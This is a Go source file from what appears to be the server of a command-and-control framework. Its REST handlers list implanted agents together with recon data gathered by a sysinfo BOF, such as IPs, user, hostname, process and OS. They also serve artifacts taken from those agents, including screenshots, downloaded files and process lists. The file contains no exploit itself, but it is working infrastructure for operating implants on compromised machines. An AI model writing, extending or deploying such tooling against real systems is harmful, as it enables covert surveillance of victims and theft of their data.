package main

// REST handlers for the persistent agent roster + per-agent artifacts.
//
//   GET  /api/agents                              list known agents (DB + live)
//   GET  /api/agents/{id}/artifacts?kind=&limit=  list artifacts for an agent
//   GET  /api/agents/{id}/artifacts/{aid}         fetch one artifact (blob or meta)
//
// Artifacts are captured server-side in session.go::readLoop when a BOF output
// arrives (file_list/proc_list -> meta text; screenshot/file_download -> blob).

import (
	"encoding/base64"
	"net/http"
	"strconv"
	"strings"
)

// AgentView is an agent row merged with live-session status + recon fields.
type AgentView struct {
	ImplantID uint64 `json:"implant_id"`
	FirstSeen int64  `json:"first_seen"`
	LastSeen  int64  `json:"last_seen"`
	Addr      string `json:"addr"`
	Note      string `json:"note,omitempty"`
	Online    bool   `json:"online"`
	// Recon fields from the auto-run sysinfo BOF (persisted across restarts).
	InternalIP  string `json:"internal_ip,omitempty"`
	ExternalIP  string `json:"external_ip,omitempty"`
	User        string `json:"user,omitempty"`
	Computer    string `json:"computer,omitempty"`
	ProcessName string `json:"process_name,omitempty"`
	PID         string `json:"pid,omitempty"`
	OS          string `json:"os,omitempty"`
	OSBuild     string `json:"os_build,omitempty"`
	Arch        string `json:"arch,omitempty"`
	OnlineTime  string `json:"online_time,omitempty"`
}

func agentsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "GET only", http.StatusMethodNotAllowed)
		return
	}
	if store == nil {
		writeJSON(w, http.StatusOK, []AgentView{})
		return
	}
	rows, err := store.ListAgents()
	if err != nil {
		http.Error(w, "agents: "+err.Error(), http.StatusInternalServerError)
		return
	}
	live := manager.List() // []Implant-ish {ID,Addr,Since}
	liveIDs := map[uint64]bool{}
	for _, im := range live {
		liveIDs[im.ID] = true
	}
	// Batch-fetch sysinfo for every known agent so the roster shows recon too.
	allIDs := make([]uint64, 0, len(rows)+len(live))
	for _, a := range rows {
		allIDs = append(allIDs, a.ImplantID)
	}
	for _, im := range live {
		if _, ok := liveIDs[im.ID]; ok {
			continue
		}
		allIDs = append(allIDs, im.ID)
	}
	sysBatch, _ := store.GetSysinfoBatch(allIDs)
	out := make([]AgentView, 0, len(rows))
	for _, a := range rows {
		v := AgentView{
			ImplantID: a.ImplantID, FirstSeen: a.FirstSeen, LastSeen: a.LastSeen,
			Addr: a.Addr, Note: a.Note, Online: liveIDs[a.ImplantID],
		}
		mergeSysinfo(&v, sysBatch[a.ImplantID])
		out = append(out, v)
	}
	// include live sessions not yet in the DB (shouldn't happen — TouchAgent
	// runs on connect — but be defensive)
	for _, im := range live {
		if _, seen := liveIDs[im.ID]; !seen {
			// already in rows? skip
			already := false
			for _, o := range out {
				if o.ImplantID == im.ID {
					already = true
					break
				}
			}
			if !already {
				v := AgentView{ImplantID: im.ID, Addr: im.Addr, Online: true}
				mergeSysinfo(&v, sysBatch[im.ID])
				out = append(out, v)
			}
		}
	}
	writeJSON(w, http.StatusOK, out)
}

// mergeSysinfo copies the parsed BOF fields onto the agent view.
func mergeSysinfo(v *AgentView, f map[string]string) {
	if len(f) == 0 {
		return
	}
	v.InternalIP = f["internal_ip"]
	v.ExternalIP = f["external_ip"]
	v.User = f["user"]
	v.Computer = f["computer"]
	v.ProcessName = f["process"]
	v.PID = f["pid"]
	v.OS = f["os"]
	v.OSBuild = f["os_build"]
	v.Arch = f["arch"]
	v.OnlineTime = f["online_time"]
}

// /api/agents/{id}/artifacts and /api/agents/{id}/artifacts/{aid}
func agentArtifactsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "GET only", http.StatusMethodNotAllowed)
		return
	}
	rest := strings.TrimPrefix(r.URL.Path, "/api/agents/")
	parts := strings.SplitN(rest, "/", 3)
	if len(parts) < 2 || parts[1] != "artifacts" {
		http.NotFound(w, r)
		return
	}
	implantID, _ := strconv.ParseUint(parts[0], 10, 64)
	if implantID == 0 {
		http.Error(w, "bad agent id", http.StatusBadRequest)
		return
	}

	// /api/agents/{id}/artifacts/{aid} -> fetch one
	if len(parts) == 3 && parts[2] != "" {
		aid, err := strconv.ParseInt(parts[2], 10, 64)
		if err != nil {
			http.Error(w, "bad artifact id", http.StatusBadRequest)
			return
		}
		blob, kind, err := store.GetArtifactBlob(aid)
		if err != nil {
			// maybe a text-only artifact (no blob) — return meta instead
			meta, kind2, err2 := store.GetArtifactMeta(aid)
			if err2 != nil {
				http.Error(w, "not found", http.StatusNotFound)
				return
			}
			writeJSON(w, http.StatusOK, map[string]string{"id": parts[2], "kind": kind2, "meta": meta})
			return
		}
		writeJSON(w, http.StatusOK, map[string]string{
			"id":   parts[2],
			"kind": kind,
			"b64":  base64.StdEncoding.EncodeToString(blob),
		})
		return
	}

	// /api/agents/{id}/artifacts?kind=&limit= -> list
	kind := ArtifactKind(r.URL.Query().Get("kind"))
	limit, _ := strconv.Atoi(r.URL.Query().Get("limit"))
	arts, err := store.ListArtifacts(implantID, kind, limit)
	if err != nil {
		http.Error(w, "artifacts: "+err.Error(), http.StatusInternalServerError)
		return
	}
	writeJSON(w, http.StatusOK, arts)
}
